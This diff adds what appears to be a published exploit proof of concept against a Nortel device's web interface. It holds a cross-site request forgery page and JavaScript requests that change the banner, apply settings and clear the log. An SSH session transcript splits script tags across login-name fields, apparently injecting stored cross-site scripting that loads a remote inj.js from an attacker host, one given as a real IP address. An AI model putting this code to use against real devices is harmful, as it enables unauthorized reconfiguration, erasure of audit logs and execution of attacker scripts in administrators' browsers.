@@ -1,0 +1,72 @@
+
+&lt;html&gt;
+&lt;head&gt;
+
+&lt;title&gt;Nortel XSRF&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;script src=&quot;http://www.example.com/switchSystem.html/bar?banner=newBanner&lt;/script&gt;
+&lt;script src=&quot;http://www.example.com/TopToolArea.html?actionState=apply&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+var request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+
+//Change banner
+request.open(&quot;GET&quot;,
+&quot;http://www.example.com/switchSystem.html/bar?banner=thx2Kononenko&quot;, false);
+request.send(null);
+
+
+request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+
+//apply changes
+request.open(&quot;GET&quot;, &quot;http://www.example.com/TopToolArea.html?actionState=apply&quot;,
+false);
+request.send(null);
+
+request = !window.ActiveXObject ? new XMLHttpRequest() : new
+ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+
+//Clear log
+request.open(&quot;GET&quot;, &quot;http://www.example.com/clearLog.html&quot;, false);
+request.send(null);
+
+
+Attacker can include this code into log  without use of &lt;EvilHost&gt;.
+But this way faster.
+
+Next step - connect via SSH and inject parts of code.
+
+Exploit:
+
+alexey@shell#:ssh www.example.com
+
+login as: &lt;script a=&quot;
+&lt;script a=&quot;@www.example.com&#039;s password:
+Access denied^C
+
+alexey@shell#:ssh www.example.com
+
+login as: &quot; src=&quot;http://&lt;EvilHost&gt;/inj.js&quot; b=&quot;
+&quot; src=&quot;http://212.24.49.12/inj.js&quot; b=&quot; com2=&quot;@www.example.coms password:
+Access denied^C
+
+alexey@shell#:ssh www.example.com
+
+alexey@shell#:ssh www.example.com
+
+login as: &quot; src=&quot;http://&lt;EvilHost&gt;/inj.js&quot; b=&quot;
+&quot; src=&quot;http://212.24.49.12/inj.js&quot; b=&quot; com2=&quot;@www.example.coms password:
+Access denied^C
+
+alexey@shell#:ssh www.example.com
+
+login as: &quot;&gt;&lt;/script&gt;
+&quot;&gt;&lt;/script&gt;@www.example.com&#039;s password:
+Access denied^C
